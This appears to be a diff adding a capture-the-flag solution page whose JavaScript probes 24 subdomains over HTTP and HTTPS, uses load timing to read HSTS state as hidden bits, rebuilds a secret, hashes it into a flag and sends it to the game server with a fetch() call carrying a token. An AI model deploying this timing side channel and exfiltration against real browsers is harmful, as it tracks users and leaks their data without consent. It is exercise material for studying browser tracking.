@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>HSTS flag extractor</title>
+  <!-- SHA‑256 polyfill (works even if crypto.subtle is unavailable) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+</head>
+<body>
+<script>
+/* ---- leak() supplied by the CTF ---- */
+function leak(data) {
+  fetch(`https://gameserver.websec.saarland/leak?secret=0ab1191eb8d8453c2663adc4869d040d&data=${encodeURIComponent(data)}`);
+}
+
+/* ---- probe a single bit (sub‑domain n) ---- */
+async function testBit(n) {
+  const http  = `http://${n}.tracking.jeopardy.websec.saarland/get`;
+  const https = `https://${n}.tracking.jeopardy.websec.saarland/get`;
+
+  /* Load via HTTP (may upgrade) */
+  const t0 = performance.now();
+  const okHTTP = await new Promise(res => {
+    const img = new Image();
+    img.onload  = () => res(true);
+    img.onerror = () => res(false);
+    img.src = http + '?r=' + Math.random();
+  });
+  const dtHTTP = performance.now() - t0;
+
+  /* Load via HTTPS directly */
+  const t1 = performance.now();
+  const okHTTPS = await new Promise(res => {
+    const img = new Image();
+    img.onload  = () => res(true);
+    img.onerror = () => res(false);
+    img.src = https + '?r=' + Math.random();
+  });
+  const dtHTTPS = performance.now() - t1;
+
+  /* If behaviour + timing are ~identical, the HTTP request was upgraded ⇒ bit 1.
+     Otherwise (plain‑HTTP round‑trip differs) ⇒ bit 0. */
+  const identical = (okHTTP === okHTTPS) && (Math.abs(dtHTTP - dtHTTPS) < 50);
+  return identical ? 1 : 0;
+}
+
+/* ---- main ---- */
+(async () => {
+  const bits = [];
+  for (let i = 0; i < 24; i++) bits[i] = await testBit(i);   // probe 0..23
+
+  /* If the setter encoded MSB in sub‑domain 23, reverse the array.
+     Remove this line if your tests show the opposite order. */
+  bits.reverse();
+
+  /* 24 bits → 3 bytes → secret string */
+  const bytes = [];
+  for (let i = 0; i < 24; i += 8) {
+    bytes.push(parseInt(bits.slice(i, i + 8).join(''), 2));
+  }
+  const secret = String.fromCharCode(...bytes);
+
+  /* SHA‑256 hash (using Crypto‑JS) */
+  const flag = 'SWAG{' + CryptoJS.SHA256(secret).toString(CryptoJS.enc.Hex) + '}';
+
+  /* exfiltrate */
+  leak(flag);
+})();
+</script>
+</body>
+</html>
